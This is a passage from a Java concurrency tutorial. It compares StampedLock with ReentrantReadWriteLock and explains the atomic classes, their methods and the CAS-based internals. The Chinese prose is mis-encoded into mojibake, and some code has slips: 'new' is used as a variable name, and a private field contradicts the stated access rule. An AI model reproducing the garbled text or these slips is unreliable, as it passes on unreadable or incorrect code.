<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockPerformanceComparison</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">StampedLock</span> <span class="hljs-variable">stampedLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedLock</span>();
    
    <span class="hljs-comment">// ReentrantReadWriteLock</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readWithRWLock</span><span class="hljs-params">()</span> {
        rwLock.readLock().lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è¯»æ“ä½œ</span>
        } <span class="hljs-keyword">finally</span> {
            rwLock.readLock().unlock();
        }
    }
    
    <span class="hljs-comment">// StampedLockä¹è§‚è¯»</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readWithStampedLock</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> stampedLock.tryOptimisticRead();
        <span class="hljs-comment">// è¯»æ“ä½œ</span>
        <span class="hljs-keyword">if</span> (!stampedLock.validate(stamp)) {
            stamp = stampedLock.readLock();
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// è¯»æ“ä½œ</span>
            } <span class="hljs-keyword">finally</span> {
                stampedLock.unlockRead(stamp);
            }
        }
    }
}
</code></pre>
<p><strong>æ€§èƒ½ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è¯»å¤šå†™å°‘</strong>ï¼šStampedLockï¼ˆä¹è§‚è¯»ï¼‰æ€§èƒ½æœ€å¥½</li>
<li><strong>å†™å¤šè¯»å°‘</strong>ï¼šæ€§èƒ½æ¥è¿‘</li>
<li><strong>è¯»æ“ä½œå æ¯”é«˜</strong>ï¼šStampedLockä¼˜åŠ¿æ˜æ˜¾ï¼ˆå‡å°‘é”ç«äº‰ï¼‰</li>
</ul>
<p><strong>ä½¿ç”¨å»ºè®®ï¼š</strong></p>
<ul>
<li>è¯»å¤šå†™å°‘ï¼šä¼˜å…ˆä½¿ç”¨StampedLock</li>
<li>éœ€è¦é‡å…¥ï¼šä½¿ç”¨ReentrantReadWriteLock</li>
<li>éœ€è¦Conditionï¼šä½¿ç”¨ReentrantReadWriteLock</li>
</ul>
<hr/>
<h2 data-id="heading-190">ç¬¬ä¹ç«  åŸå­ç±»ï¼ˆAtomicï¼‰</h2>
<h3 data-id="heading-191">9.1 åŸå­ç±»æ¦‚è¿°</h3>
<h4 data-id="heading-192">åŸå­ç±»çš„åˆ†ç±»</h4>
<p>Javaä¸­çš„åŸå­ç±»åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š</p>
<p><strong>1. åŸºæœ¬ç±»å‹åŸå­ç±»</strong></p>
<ul>
<li><code>AtomicInteger</code> - åŸå­æ•´å‹</li>
<li><code>AtomicLong</code> - åŸå­é•¿æ•´å‹</li>
<li><code>AtomicBoolean</code> - åŸå­å¸ƒå°”å‹</li>
</ul>
<p><strong>2. æ•°ç»„ç±»å‹åŸå­ç±»</strong></p>
<ul>
<li><code>AtomicIntegerArray</code> - åŸå­æ•´å‹æ•°ç»„</li>
<li><code>AtomicLongArray</code> - åŸå­é•¿æ•´å‹æ•°ç»„</li>
<li><code>AtomicReferenceArray</code> - åŸå­å¼•ç”¨æ•°ç»„</li>
</ul>
<p><strong>3. å¼•ç”¨ç±»å‹åŸå­ç±»</strong></p>
<ul>
<li><code>AtomicReference</code> - åŸå­å¼•ç”¨</li>
<li><code>AtomicStampedReference</code> - å¸¦ç‰ˆæœ¬å·çš„åŸå­å¼•ç”¨ï¼ˆè§£å†³ABAé—®é¢˜ï¼‰</li>
<li><code>AtomicMarkableReference</code> - å¸¦æ ‡è®°ä½çš„åŸå­å¼•ç”¨</li>
</ul>
<p><strong>4. å­—æ®µæ›´æ–°å™¨</strong></p>
<ul>
<li><code>AtomicIntegerFieldUpdater</code> - æ•´å‹å­—æ®µæ›´æ–°å™¨</li>
<li><code>AtomicLongFieldUpdater</code> - é•¿æ•´å‹å­—æ®µæ›´æ–°å™¨</li>
<li><code>AtomicReferenceFieldUpdater</code> - å¼•ç”¨ç±»å‹å­—æ®µæ›´æ–°å™¨</li>
</ul>
<p><strong>5. ç´¯åŠ å™¨ç±»ï¼ˆJDK 8+ï¼‰</strong></p>
<ul>
<li><code>LongAdder</code> - é•¿æ•´å‹ç´¯åŠ å™¨</li>
<li><code>LongAccumulator</code> - é•¿æ•´å‹ç´¯åŠ å™¨</li>
<li><code>DoubleAdder</code> - åŒç²¾åº¦ç´¯åŠ å™¨</li>
<li><code>DoubleAccumulator</code> - åŒç²¾åº¦ç´¯åŠ å™¨</li>
</ul>
<h4 data-id="heading-193">åŸå­ç±»çš„ä¼˜åŠ¿</h4>
<p><strong>1. æ— é”ç¼–ç¨‹</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼ï¼ˆéœ€è¦é”ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;
}

<span class="hljs-comment">// åŸå­ç±»æ–¹å¼ï¼ˆæ— é”ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();
}
</code></pre>
<p><strong>2. é«˜æ€§èƒ½</strong></p>
<ul>
<li>ä½¿ç”¨CASæ“ä½œï¼Œé¿å…çº¿ç¨‹é˜»å¡</li>
<li>åœ¨ä½ç«äº‰åœºæ™¯ä¸‹æ€§èƒ½ä¼˜äºsynchronized</li>
<li>é€‚åˆé«˜å¹¶å‘åœºæ™¯</li>
</ul>
<p><strong>3. çº¿ç¨‹å®‰å…¨</strong></p>
<ul>
<li>æ‰€æœ‰æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„</li>
<li>ä¿è¯çº¿ç¨‹å®‰å…¨ï¼Œæ— éœ€é¢å¤–çš„åŒæ­¥æœºåˆ¶</li>
</ul>
<p><strong>4. ç®€å•æ˜“ç”¨</strong></p>
<ul>
<li>APIç®€æ´æ˜äº†</li>
<li>ä¸éœ€è¦æ‰‹åŠ¨ç®¡ç†é”</li>
</ul>
<h3 data-id="heading-194">9.2 åŸºæœ¬ç±»å‹åŸå­ç±»</h3>
<h4 data-id="heading-195">AtomicInteger</h4>
<p><strong>AtomicIntegerå¸¸ç”¨æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// åŸºæœ¬æ“ä½œ</span>
count.get();                           <span class="hljs-comment">// è·å–å€¼</span>
count.set(<span class="hljs-number">10</span>);                         <span class="hljs-comment">// è®¾ç½®å€¼</span>
count.getAndSet(<span class="hljs-number">20</span>);                   <span class="hljs-comment">// è·å–æ—§å€¼å¹¶è®¾ç½®æ–°å€¼</span>
count.compareAndSet(<span class="hljs-number">20</span>, <span class="hljs-number">30</span>);          <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>

<span class="hljs-comment">// è‡ªå¢è‡ªå‡</span>
count.incrementAndGet();               <span class="hljs-comment">// ++countï¼Œè¿”å›æ–°å€¼</span>
count.getAndIncrement();               <span class="hljs-comment">// count++ï¼Œè¿”å›æ—§å€¼</span>
count.decrementAndGet();               <span class="hljs-comment">// --countï¼Œè¿”å›æ–°å€¼</span>
count.getAndDecrement();               <span class="hljs-comment">// count--ï¼Œè¿”å›æ—§å€¼</span>

<span class="hljs-comment">// åŠ å‡æ“ä½œ</span>
count.addAndGet(<span class="hljs-number">5</span>);                    <span class="hljs-comment">// åŠ 5ï¼Œè¿”å›æ–°å€¼</span>
count.getAndAdd(<span class="hljs-number">10</span>);                   <span class="hljs-comment">// è¿”å›æ—§å€¼ï¼Œå†åŠ 10</span>

<span class="hljs-comment">// å‡½æ•°å¼æ›´æ–°ï¼ˆJDK 8+ï¼‰</span>
count.updateAndGet(x -&gt; x * <span class="hljs-number">2</span>);        <span class="hljs-comment">// åŸå­æ›´æ–°</span>
count.getAndUpdate(x -&gt; x / <span class="hljs-number">2</span>);        <span class="hljs-comment">// è·å–å¹¶æ›´æ–°</span>
</code></pre>
<p><strong>ç®€å•åº”ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çº¿ç¨‹å®‰å…¨çš„è®¡æ•°å™¨</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  <span class="hljs-comment">// åŸå­æ“ä½œï¼Œæ— éœ€é”</span>
}
</code></pre>
<h4 data-id="heading-196">AtomicLong</h4>
<p><strong>AtomicLongä¸AtomicIntegerç±»ä¼¼ï¼Œç”¨äºé•¿æ•´å‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicLong</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(<span class="hljs-number">0L</span>);
total.addAndGet(<span class="hljs-number">100</span>);                  <span class="hljs-comment">// å¢åŠ 100</span>
total.get();                           <span class="hljs-comment">// è·å–å€¼</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>åœ¨32ä½JVMä¸Šï¼Œlongçš„è¯»å†™ä¸æ˜¯åŸå­çš„</li>
<li>AtomicLongä¿è¯longç±»å‹çš„åŸå­æ“ä½œ</li>
<li>JDK 8+æ¨èä½¿ç”¨LongAdderï¼Œæ€§èƒ½æ›´å¥½</li>
</ul>
<h4 data-id="heading-197">AtomicBoolean</h4>
<p><strong>AtomicBooleanç”¨äºå¸ƒå°”ç±»å‹çš„åŸå­æ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">false</span>);
flag.get();                            <span class="hljs-comment">// è·å–å€¼</span>
flag.set(<span class="hljs-literal">true</span>);                        <span class="hljs-comment">// è®¾ç½®å€¼</span>
flag.compareAndSet(<span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);      <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
flag.getAndSet(<span class="hljs-literal">false</span>);                <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
flag.lazySet(<span class="hljs-literal">true</span>);                   <span class="hljs-comment">// å»¶è¿Ÿè®¾ç½®</span>
</code></pre>
<p><strong>çŠ¶æ€æ ‡å¿—ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">AtomicBoolean</span> <span class="hljs-variable">running</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicBoolean</span>(<span class="hljs-literal">true</span>);

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">()</span> {
    running.set(<span class="hljs-literal">false</span>);
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">while</span> (running.get()) {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
    }
}
</code></pre>
<h4 data-id="heading-198">å¸¸ç”¨æ–¹æ³•æ€»ç»“</h4>
<p><strong>æ‰€æœ‰åŸºæœ¬ç±»å‹åŸå­ç±»éƒ½æä¾›ä»¥ä¸‹æ–¹æ³•ï¼š</strong></p>

































































<table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th><th>è¿”å›å€¼</th></tr></thead><tbody><tr><td><code>get()</code></td><td>è·å–å½“å‰å€¼</td><td>å½“å‰å€¼</td></tr><tr><td><code>set(int newValue)</code></td><td>è®¾ç½®æ–°å€¼</td><td>void</td></tr><tr><td><code>getAndSet(int newValue)</code></td><td>è·å–å½“å‰å€¼å¹¶è®¾ç½®æ–°å€¼</td><td>æ—§å€¼</td></tr><tr><td><code>compareAndSet(int expect, int update)</code></td><td>æ¯”è¾ƒå¹¶è®¾ç½®</td><td>boolean</td></tr><tr><td><code>lazySet(int newValue)</code></td><td>å»¶è¿Ÿè®¾ç½®ï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰</td><td>void</td></tr><tr><td><code>getAndIncrement()</code></td><td>å…ˆè¿”å›å†è‡ªå¢</td><td>æ—§å€¼</td></tr><tr><td><code>incrementAndGet()</code></td><td>å…ˆè‡ªå¢å†è¿”å›</td><td>æ–°å€¼</td></tr><tr><td><code>getAndDecrement()</code></td><td>å…ˆè¿”å›å†è‡ªå‡</td><td>æ—§å€¼</td></tr><tr><td><code>decrementAndGet()</code></td><td>å…ˆè‡ªå‡å†è¿”å›</td><td>æ–°å€¼</td></tr><tr><td><code>getAndAdd(int delta)</code></td><td>å…ˆè¿”å›å†åŠ </td><td>æ—§å€¼</td></tr><tr><td><code>addAndGet(int delta)</code></td><td>å…ˆåŠ å†è¿”å›</td><td>æ–°å€¼</td></tr></tbody></table>
<h3 data-id="heading-199">9.3 æ•°ç»„ç±»å‹åŸå­ç±»</h3>
<h4 data-id="heading-200">AtomicIntegerArray</h4>
<p><strong>AtomicIntegerArrayç”¨äºåŸå­åœ°æ›´æ–°æ•°ç»„ä¸­çš„å…ƒç´ ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicIntegerArray</span> <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicIntegerArray</span>(<span class="hljs-number">10</span>);
array.get(<span class="hljs-number">0</span>);                          <span class="hljs-comment">// è·å–ç´¢å¼•0çš„å€¼</span>
array.set(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>);                      <span class="hljs-comment">// è®¾ç½®ç´¢å¼•0çš„å€¼</span>
array.getAndSet(<span class="hljs-number">0</span>, <span class="hljs-number">20</span>);               <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
array.compareAndSet(<span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>);      <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
array.incrementAndGet(<span class="hljs-number">0</span>);             <span class="hljs-comment">// ç´¢å¼•0è‡ªå¢</span>
array.addAndGet(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>);                <span class="hljs-comment">// ç´¢å¼•0åŠ 5</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>æ•°ç»„é•¿åº¦åœ¨åˆ›å»ºæ—¶ç¡®å®šï¼Œä¸èƒ½æ”¹å˜</li>
<li>æ¯ä¸ªå…ƒç´ éƒ½æ˜¯åŸå­æ“ä½œçš„</li>
<li>ä¸åŒç´¢å¼•çš„å…ƒç´ å¯ä»¥å¹¶å‘è®¿é—®</li>
</ul>
<h4 data-id="heading-201">AtomicLongArray</h4>
<p><strong>AtomicLongArrayä¸AtomicIntegerArrayç±»ä¼¼ï¼Œç”¨äºé•¿æ•´å‹æ•°ç»„ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicLongArray</span> <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLongArray</span>(<span class="hljs-number">10</span>);
array.addAndGet(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>);               <span class="hljs-comment">// æ–¹æ³•åŒAtomicIntegerArray</span>
</code></pre>
<h4 data-id="heading-202">AtomicReferenceArray</h4>
<p><strong>AtomicReferenceArrayç”¨äºå¼•ç”¨ç±»å‹æ•°ç»„çš„åŸå­æ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicReferenceArray&lt;String&gt; array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReferenceArray</span>&lt;&gt;(<span class="hljs-number">10</span>);
array.set(<span class="hljs-number">0</span>, <span class="hljs-string">"Hello"</span>);                 <span class="hljs-comment">// è®¾ç½®å…ƒç´ </span>
array.get(<span class="hljs-number">0</span>);                          <span class="hljs-comment">// è·å–å…ƒç´ </span>
array.compareAndSet(<span class="hljs-number">0</span>, <span class="hljs-string">"Hello"</span>, <span class="hljs-string">"World"</span>);  <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
array.getAndSet(<span class="hljs-number">0</span>, <span class="hljs-string">"Java"</span>);           <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
</code></pre>
<h3 data-id="heading-203">9.4 å¼•ç”¨ç±»å‹åŸå­ç±»</h3>
<h4 data-id="heading-204">AtomicReference</h4>
<p><strong>AtomicReferenceç”¨äºåŸå­åœ°æ›´æ–°å¼•ç”¨ç±»å‹å˜é‡ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(<span class="hljs-string">"åˆå§‹å€¼"</span>);
ref.get();                              <span class="hljs-comment">// è·å–å€¼</span>
ref.set(<span class="hljs-string">"æ–°å€¼"</span>);                        <span class="hljs-comment">// è®¾ç½®å€¼</span>
ref.compareAndSet(<span class="hljs-string">"æ–°å€¼"</span>, <span class="hljs-string">"æ›´æ–°å€¼"</span>);   <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
ref.getAndSet(<span class="hljs-string">"æœ€ç»ˆå€¼"</span>);               <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
</code></pre>
<p><strong>å•ä¾‹æ¨¡å¼åº”ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> AtomicReference&lt;Singleton&gt; instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Singleton</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> instance.get();
    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">null</span>) {
        current = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();
        <span class="hljs-keyword">if</span> (instance.compareAndSet(<span class="hljs-literal">null</span>, current)) {
            <span class="hljs-keyword">return</span> current;
        }
        <span class="hljs-keyword">return</span> instance.get();
    }
    <span class="hljs-keyword">return</span> current;
}
</code></pre>
<h4 data-id="heading-205">AtomicStampedReference</h4>
<p><strong>AtomicStampedReferenceé€šè¿‡ç‰ˆæœ¬å·è§£å†³ABAé—®é¢˜ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicStampedReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicStampedReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-type">int</span>[] stampHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(stampHolder);
<span class="hljs-type">int</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> stampHolder[<span class="hljs-number">0</span>];

<span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®ï¼ˆåŒæ—¶æ¯”è¾ƒå€¼å’Œç‰ˆæœ¬å·ï¼‰</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, stamp, stamp + <span class="hljs-number">1</span>);

<span class="hljs-comment">// è®¾ç½®å€¼å’Œç‰ˆæœ¬å·</span>
ref.set(<span class="hljs-string">"C"</span>, stamp + <span class="hljs-number">2</span>);
</code></pre>
<h4 data-id="heading-206">AtomicMarkableReference</h4>
<p><strong>AtomicMarkableReferenceä½¿ç”¨booleanæ ‡è®°ä»£æ›¿ç‰ˆæœ¬å·ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicMarkableReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicMarkableReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// è·å–å€¼å’Œæ ‡è®°</span>
<span class="hljs-type">boolean</span>[] markHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(markHolder);
<span class="hljs-type">boolean</span> <span class="hljs-variable">mark</span> <span class="hljs-operator">=</span> markHolder[<span class="hljs-number">0</span>];

<span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®ï¼ˆåŒæ—¶æ¯”è¾ƒå€¼å’Œæ ‡è®°ï¼‰</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);

<span class="hljs-comment">// å°è¯•è®¾ç½®æ ‡è®°</span>
ref.attemptMark(<span class="hljs-string">"C"</span>, <span class="hljs-literal">true</span>);
</code></pre>
<h3 data-id="heading-207">9.5 å­—æ®µæ›´æ–°å™¨</h3>
<h4 data-id="heading-208">AtomicIntegerFieldUpdater</h4>
<p><strong>AtomicIntegerFieldUpdaterç”¨äºåŸå­åœ°æ›´æ–°å¯¹è±¡çš„æ•´å‹å­—æ®µã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å­—æ®µå¿…é¡»æ˜¯volatileç±»å‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// åˆ›å»ºæ›´æ–°å™¨</span>
AtomicIntegerFieldUpdater&lt;Counter&gt; updater = 
    AtomicIntegerFieldUpdater.newUpdater(Counter.class, <span class="hljs-string">"count"</span>);

<span class="hljs-comment">// ä½¿ç”¨æ›´æ–°å™¨</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">counter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
updater.get(counter);                  <span class="hljs-comment">// è·å–å€¼</span>
updater.set(counter, <span class="hljs-number">10</span>);              <span class="hljs-comment">// è®¾ç½®å€¼</span>
updater.incrementAndGet(counter);      <span class="hljs-comment">// è‡ªå¢</span>
updater.addAndGet(counter, <span class="hljs-number">5</span>);         <span class="hljs-comment">// åŠ 5</span>
</code></pre>
<p><strong>ä½¿ç”¨é™åˆ¶ï¼š</strong></p>
<ul>
<li>å­—æ®µå¿…é¡»æ˜¯volatileç±»å‹</li>
<li>å­—æ®µå¿…é¡»æ˜¯å¯è®¿é—®çš„ï¼ˆpublicæˆ–protectedï¼‰</li>
<li>ä¸èƒ½æ˜¯staticå­—æ®µ</li>
<li>ä¸èƒ½æ˜¯finalå­—æ®µ</li>
</ul>
<h4 data-id="heading-209">AtomicLongFieldUpdater</h4>
<p><strong>AtomicLongFieldUpdaterç”¨äºé•¿æ•´å‹å­—æ®µçš„åŸå­æ›´æ–°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> <span class="hljs-variable">balance</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
}

AtomicLongFieldUpdater&lt;Account&gt; updater = 
    AtomicLongFieldUpdater.newUpdater(Account.class, <span class="hljs-string">"balance"</span>);
updater.addAndGet(account, <span class="hljs-number">100</span>);       <span class="hljs-comment">// æ–¹æ³•åŒAtomicIntegerFieldUpdater</span>
</code></pre>
<h4 data-id="heading-210">AtomicReferenceFieldUpdater</h4>
<p><strong>AtomicReferenceFieldUpdaterç”¨äºå¼•ç”¨ç±»å‹å­—æ®µçš„åŸå­æ›´æ–°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> Node next;        <span class="hljs-comment">// å¿…é¡»æ˜¯volatile</span>
}

AtomicReferenceFieldUpdater&lt;Node, Node&gt; updater = 
    AtomicReferenceFieldUpdater.newUpdater(Node.class, Node.class, <span class="hljs-string">"next"</span>);

<span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
updater.get(node);                     <span class="hljs-comment">// è·å–å€¼</span>
updater.set(node, newNode);            <span class="hljs-comment">// è®¾ç½®å€¼</span>
updater.compareAndSet(node, old, <span class="hljs-keyword">new</span>); <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
</code></pre>
<h3 data-id="heading-211">9.6 åŸå­ç±»çš„å®ç°åŸç†</h3>
<h4 data-id="heading-212">CASæ“ä½œ</h4>
<p><strong>åŸå­ç±»çš„æ ¸å¿ƒæ˜¯CASæ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AtomicIntegerçš„incrementAndGetå®ç°ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">incrementAndGet</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> unsafe.getAndAddInt(<span class="hljs-built_in">this</span>, valueOffset, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;
}

<span class="hljs-comment">// Unsafeçš„getAndAddIntå®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAndAddInt</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> delta)</span> {
    <span class="hljs-type">int</span> v;
    <span class="hljs-keyword">do</span> {
        v = getIntVolatile(o, offset); <span class="hljs-comment">// è·å–å½“å‰å€¼</span>
        <span class="hljs-comment">// CASå°è¯•æ›´æ–°ï¼Œå¦‚æœå¤±è´¥åˆ™è‡ªæ—‹é‡è¯•</span>
    } <span class="hljs-keyword">while</span> (!compareAndSwapInt(o, offset, v, v + delta));
    <span class="hljs-keyword">return</span> v;
}
</code></pre>
<h4 data-id="heading-213">Unsafeç±»çš„ä½¿ç”¨</h4>
<p><strong>åŸå­ç±»é€šè¿‡Unsafeç±»ç›´æ¥æ“ä½œå†…å­˜ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicInteger</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Number</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> Unsafe.getUnsafe();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> valueOffset; <span class="hljs-comment">// valueå­—æ®µçš„åç§»é‡</span>
    
    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è·å–valueå­—æ®µåœ¨å¯¹è±¡ä¸­çš„åç§»é‡</span>
            valueOffset = unsafe.objectFieldOffset
